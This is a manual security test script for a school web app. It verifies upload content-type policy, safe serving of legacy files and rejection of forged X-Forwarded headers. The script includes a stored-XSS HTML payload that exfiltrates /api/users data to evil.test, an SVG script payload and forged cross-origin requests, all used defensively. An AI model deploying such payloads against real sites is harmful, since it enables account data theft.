/*
 * Live probe for the uploaded-file content policy and the forwarded-header
 * trust policy. Runs against a PRODUCTION build on a DISPOSABLE database.
 *
 * The point of this probe is the thing the review called out: proving the
 * issue is not fixed merely because the upload endpoint refuses a filename.
 * It checks the ACTUAL SERVED RESPONSE, including a row that is written
 * directly into the database to simulate a file uploaded before the fix.
 *
 * This is a MANUAL probe. It is not part of `npm test` and CI does not run
 * it, because it needs a running production server and a seeded database. Run
 * it from the repository root:
 *
 *   1. A disposable PostgreSQL with the migration chain applied, and the
 *      application running against it:
 *
 *        DATABASE_URL=postgres://test:test@127.0.0.1:5432/easylearn_secfix \
 *        JWT_SECRET="$(openssl rand -base64 48)" \
 *        EASY_LEARN_TEST_DATABASE=true UPLOAD_DIR=/tmp/probe-uploads \
 *        NODE_ENV=production npx next start -p 3300
 *
 *   2. Then:
 *
 *        DATABASE_URL=... UPLOAD_DIR=/tmp/probe-uploads \
 *        PROBE_BASE=http://127.0.0.1:3300 \
 *        node tests/manual/live-upload-content-probe.js
 *
 * Run it against the pre-fix commit to see the vulnerability (the "legacy row"
 * checks fail and the row is served as text/html), and against the fixed
 * commit to see it closed.
 */
"use strict";

const { Client } = require("pg");
const bcrypt = require("bcryptjs");
const fs = require("fs");
const path = require("path");

const BASE = process.env.PROBE_BASE || "http://127.0.0.1:3300";
const DATABASE_URL =
  process.env.DATABASE_URL || "postgres://test:test@127.0.0.1:5432/easylearn_secfix";
const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/secfix-uploads";

let passed = 0;
let failed = 0;
const failures = [];

function check(name, condition, detail) {
  if (condition) {
    console.log(`✅ PASS: ${name}`);
    passed++;
  } else {
    console.error(`❌ FAIL: ${name}${detail ? `\n   ${detail}` : ""}`);
    failures.push(name);
    failed++;
  }
}

const PNG_BYTES = Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
]);
const HTML_PAYLOAD = Buffer.from(
  `<!DOCTYPE html><html><body><script>fetch('/api/users').then(r=>r.text()).then(t=>fetch('https://evil.test/?'+t))</script></body></html>`
);
const SVG_PAYLOAD = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`
);
const ZIP_BYTES = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]);

async function seed() {
  const client = new Client({ connectionString: DATABASE_URL });
  await client.connect();

  const schoolId = "11111111-1111-4111-8111-111111111111";
  const teacherId = "22222222-2222-4222-8222-222222222222";
  const passwordHash = await bcrypt.hash("Probe123!", 12);

  await client.query(
    `INSERT INTO schools (id, name, short_name, slug, status)
     VALUES ($1, 'Probe School', 'PROBE', 'probe-school', 'active')
     ON CONFLICT (id) DO NOTHING`,
    [schoolId]
  );
  await client.query(
    `INSERT INTO users (id, email, password_hash, role, first_name, last_name, is_active, email_verified)
     VALUES ($1, 'teacher@probe.test', $2, 'teacher', 'Probe', 'Teacher', true, true)
     ON CONFLICT (id) DO NOTHING`,
    [teacherId, passwordHash]
  );
  await client.query(
    `INSERT INTO school_users (school_id, user_id, role, status)
     VALUES ($1, $2, 'teacher', 'active')
     ON CONFLICT (school_id, user_id) DO NOTHING`,
    [schoolId, teacherId]
  );
  await client.end();
  return { schoolId, teacherId };
}

async function login() {
  const response = await fetch(`${BASE}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Origin: BASE },
    body: JSON.stringify({ email: "teacher@probe.test", password: "Probe123!" }),
  });
  const body = await response.json().catch(() => null);
  const cookie = (response.headers.get("set-cookie") || "").split(";")[0];
  return { status: response.status, body, cookie, setCookie: response.headers.get("set-cookie") };
}

async function upload(cookie, filename, declaredType, bytes, purpose = "assignment") {
  const form = new FormData();
  form.append("purpose", purpose);
  form.append("file", new Blob([bytes], { type: declaredType }), filename);
  const response = await fetch(`${BASE}/api/uploads`, {
    method: "POST",
    headers: { Cookie: cookie, Origin: BASE },
    body: form,
  });
  const body = await response.json().catch(() => null);
  return { status: response.status, body };
}

async function serve(cookie, id, extraHeaders = {}) {
  const response = await fetch(`${BASE}/api/files/${id}`, {
    headers: { Cookie: cookie, Origin: BASE, ...extraHeaders },
    redirect: "manual",
  });
  const text = response.status === 200 ? await response.text().catch(() => "") : "";
  return {
    status: response.status,
    headers: response.headers,
    contentType: response.headers.get("content-type"),
    disposition: response.headers.get("content-disposition"),
    nosniff: response.headers.get("x-content-type-options"),
    csp: response.headers.get("content-security-policy"),
    corp: response.headers.get("cross-origin-resource-policy"),
    body: text,
  };
}

async function main() {
  console.log("🧪 Live uploaded-content probe\n");
  const { schoolId, teacherId } = await seed();

  // ── Login ──────────────────────────────────────────────────────────────────
  const session = await login();
  check("login succeeds", session.status === 200, `status ${session.status}`);
  check(
    "the login body carries no token",
    !JSON.stringify(session.body || {}).match(/"token"/),
    JSON.stringify(session.body || {}).slice(0, 200)
  );
  check("the session cookie is httpOnly", /HttpOnly/i.test(session.setCookie || ""), session.setCookie);
  check("the session cookie is SameSite=Lax", /SameSite=lax/i.test(session.setCookie || ""), session.setCookie);
  const cookie = session.cookie;
  check("a cookie was issued", Boolean(cookie), session.setCookie);

  // ── The upload endpoint refuses the dangerous payloads ─────────────────────
  const htmlUpload = await upload(cookie, "evil.png", "text/html", HTML_PAYLOAD);
  check(
    "an HTML payload declared as text/html is refused",
    htmlUpload.status === 400,
    `status ${htmlUpload.status}: ${JSON.stringify(htmlUpload.body)}`
  );

  const svgUpload = await upload(cookie, "evil.png", "image/svg+xml", SVG_PAYLOAD);
  check(
    "an SVG payload declared as image/svg+xml is refused",
    svgUpload.status === 400,
    `status ${svgUpload.status}: ${JSON.stringify(svgUpload.body)}`
  );

  const spoofUpload = await upload(cookie, "evil.txt", "text/plain", HTML_PAYLOAD);
  check(
    "an HTML payload renamed to .txt is refused",
    spoofUpload.status === 400,
    `status ${spoofUpload.status}: ${JSON.stringify(spoofUpload.body)}`
  );

  const zipAsPng = await upload(cookie, "archive.png", "image/png", ZIP_BYTES);
  check(
    "a ZIP renamed to .png is refused",
    zipAsPng.status === 400,
    `status ${zipAsPng.status}: ${JSON.stringify(zipAsPng.body)}`
  );

  const htmlExtension = await upload(cookie, "page.html", "text/html", HTML_PAYLOAD);
  check(
    "a .html file is refused",
    htmlExtension.status === 400,
    `status ${htmlExtension.status}: ${JSON.stringify(htmlExtension.body)}`
  );

  // ── A legitimate upload still works, and is served safely ──────────────────
  const goodPng = await upload(cookie, "photo.png", "image/png", PNG_BYTES);
  check(
    "a legitimate PNG is accepted",
    goodPng.status === 201,
    `status ${goodPng.status}: ${JSON.stringify(goodPng.body)}`
  );
  const pngId = goodPng.body?.data?.[0]?.fileId;

  if (pngId) {
    const served = await serve(cookie, pngId);
    check("the PNG is served", served.status === 200, `status ${served.status}`);
    check(
      "the PNG is served as image/png",
      served.contentType === "image/png",
      `content-type: ${served.contentType}`
    );
    check(
      "the PNG is served inline",
      /^inline/.test(served.disposition || ""),
      `disposition: ${served.disposition}`
    );
    check("the PNG response sends nosniff", served.nosniff === "nosniff", served.nosniff);
    check(
      "the PNG response is sandboxed",
      /sandbox/.test(served.csp || ""),
      `csp: ${served.csp}`
    );
    check(
      "the PNG response forbids cross-origin embedding",
      served.corp === "same-origin",
      `corp: ${served.corp}`
    );
    check(
      "the PNG bytes are the bytes that were uploaded",
      !/script/i.test(served.body),
      "the served body mentions script"
    );
  }

  const goodTxt = await upload(cookie, "notes.txt", "text/plain", Buffer.from("Just notes.\n"));
  check(
    "a legitimate text file is accepted",
    goodTxt.status === 201,
    `status ${goodTxt.status}: ${JSON.stringify(goodTxt.body)}`
  );
  const txtId = goodTxt.body?.data?.[0]?.fileId;
  if (txtId) {
    const served = await serve(cookie, txtId);
    check(
      "the text file is served as text/plain",
      /text\/plain/.test(served.contentType || ""),
      `content-type: ${served.contentType}`
    );
    check(
      "the text file is served as a download",
      /^attachment/.test(served.disposition || ""),
      `disposition: ${served.disposition}`
    );
    check("the text file response sends nosniff", served.nosniff === "nosniff", served.nosniff);
  }

  const goodZip = await upload(cookie, "archive.zip", "application/zip", ZIP_BYTES);
  check(
    "a legitimate ZIP is accepted",
    goodZip.status === 201,
    `status ${goodZip.status}: ${JSON.stringify(goodZip.body)}`
  );
  const zipId = goodZip.body?.data?.[0]?.fileId;
  if (zipId) {
    const served = await serve(cookie, zipId);
    check(
      "the ZIP is served as application/zip",
      served.contentType === "application/zip",
      `content-type: ${served.contentType}`
    );
    check(
      "the ZIP is served as a download",
      /^attachment/.test(served.disposition || ""),
      `disposition: ${served.disposition}`
    );
  }

  // ── THE KEY PROBE: a row written the way the OLD code wrote it ─────────────
  // This is what a file uploaded BEFORE the fix looks like: the `mime_type`
  // column holds the type the CLIENT declared, and the stored name ends in the
  // extension. The old route served that column as the Content-Type, so this
  // row was a stored XSS. The new route must serve it as image/png.
  const client = new Client({ connectionString: DATABASE_URL });
  await client.connect();
  const legacyId = "33333333-3333-4333-8333-333333333333";
  const legacyStoredName = `${legacyId}.png`;
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  fs.writeFileSync(path.join(UPLOAD_DIR, legacyStoredName), HTML_PAYLOAD);
  await client.query(
    `INSERT INTO uploaded_files
       (id, school_id, uploader_id, purpose, original_name, stored_name, mime_type, category, size_bytes, storage_backend)
     VALUES ($1, $2, $3, 'assignment', 'legacy.png', $4, 'text/html', 'image', $5, 'local')
     ON CONFLICT (id) DO NOTHING`,
    [legacyId, schoolId, teacherId, legacyStoredName, HTML_PAYLOAD.length]
  );

  const legacyServed = await serve(cookie, legacyId);
  check("the legacy row is served", legacyServed.status === 200, `status ${legacyServed.status}`);
  check(
    "the legacy row is NOT served as text/html",
    legacyServed.contentType !== "text/html",
    `content-type: ${legacyServed.contentType}`
  );
  check(
    "the legacy row is served as image/png",
    legacyServed.contentType === "image/png",
    `content-type: ${legacyServed.contentType}`
  );
  check(
    "the legacy row is sandboxed",
    /sandbox/.test(legacyServed.csp || ""),
    `csp: ${legacyServed.csp}`
  );
  check(
    "the legacy row sends nosniff",
    legacyServed.nosniff === "nosniff",
    legacyServed.nosniff
  );

  // A legacy row whose stored name is not on the allow-list.
  const legacyHtmlId = "44444444-4444-4444-8444-444444444444";
  const legacyHtmlName = `${legacyHtmlId}.html`;
  fs.writeFileSync(path.join(UPLOAD_DIR, legacyHtmlName), HTML_PAYLOAD);
  await client.query(
    `INSERT INTO uploaded_files
       (id, school_id, uploader_id, purpose, original_name, stored_name, mime_type, category, size_bytes, storage_backend)
     VALUES ($1, $2, $3, 'assignment', 'legacy.html', $4, 'text/html', 'document', $5, 'local')
     ON CONFLICT (id) DO NOTHING`,
    [legacyHtmlId, schoolId, teacherId, legacyHtmlName, HTML_PAYLOAD.length]
  );
  const legacyHtmlServed = await serve(cookie, legacyHtmlId);
  check(
    "a legacy .html row is served as octet-stream",
    legacyHtmlServed.contentType === "application/octet-stream",
    `content-type: ${legacyHtmlServed.contentType}`
  );
  check(
    "a legacy .html row is served as a download",
    /^attachment/.test(legacyHtmlServed.disposition || ""),
    `disposition: ${legacyHtmlServed.disposition}`
  );
  await client.end();

  // ── The forwarded-header trust policy ──────────────────────────────────────
  console.log("\n— cross-site request policy —");
  const post = async (origin, headers = {}) => {
    const response = await fetch(`${BASE}/api/messages/read`, {
      method: "POST",
      headers: {
        Cookie: cookie,
        "Content-Type": "application/json",
        ...(origin === null ? {} : { Origin: origin }),
        ...headers,
      },
      body: JSON.stringify({ messageIds: [] }),
    });
    return response.status;
  };

  const legit = await post(BASE);
  check(
    "an ordinary legitimate write is allowed",
    legit !== 403,
    `status ${legit}`
  );

  const forgedHost = await post("https://evil.test", { "X-Forwarded-Host": "evil.test" });
  check(
    "a forged X-Forwarded-Host cannot make a foreign origin acceptable",
    forgedHost === 403,
    `status ${forgedHost}`
  );

  const forgedProto = await post("https://evil.test", { "X-Forwarded-Proto": "https" });
  check(
    "a forged X-Forwarded-Proto cannot make a foreign origin acceptable",
    forgedProto === 403,
    `status ${forgedProto}`
  );

  const forgedBoth = await post("https://evil.test", {
    "X-Forwarded-Host": "evil.test",
    "X-Forwarded-Proto": "https",
  });
  check(
    "forging both forwarded headers cannot make a foreign origin acceptable",
    forgedBoth === 403,
    `status ${forgedBoth}`
  );

  const appended = await post("https://evil.test", {
    "X-Forwarded-Host": "evil.test, 127.0.0.1:3300",
  });
  check(
    "an appended X-Forwarded-Host cannot make a foreign origin acceptable",
    appended === 403,
    `status ${appended}`
  );

  const forgedButOwnOrigin = await post(BASE, { "X-Forwarded-Host": "evil.test" });
  check(
    "a forged X-Forwarded-Host does not refuse a legitimate write",
    forgedButOwnOrigin !== 403,
    `status ${forgedButOwnOrigin}`
  );

  const noOrigin = await fetch(`${BASE}/api/messages/read`, {
    method: "POST",
    headers: { Cookie: cookie, "Content-Type": "application/json" },
    body: JSON.stringify({ messageIds: [] }),
  });
  check(
    "a write with no Origin and no Sec-Fetch-Site is refused",
    noOrigin.status === 403,
    `status ${noOrigin.status}`
  );

  console.log(`\n📊 Results: ${passed} passed, ${failed} failed`);
  if (failed > 0) {
    console.error(`\nFailed: ${failures.join(", ")}`);
    process.exitCode = 1;
  }
}

main().catch((error) => {
  console.error("Probe failed to run:", error);
  process.exitCode = 1;
});
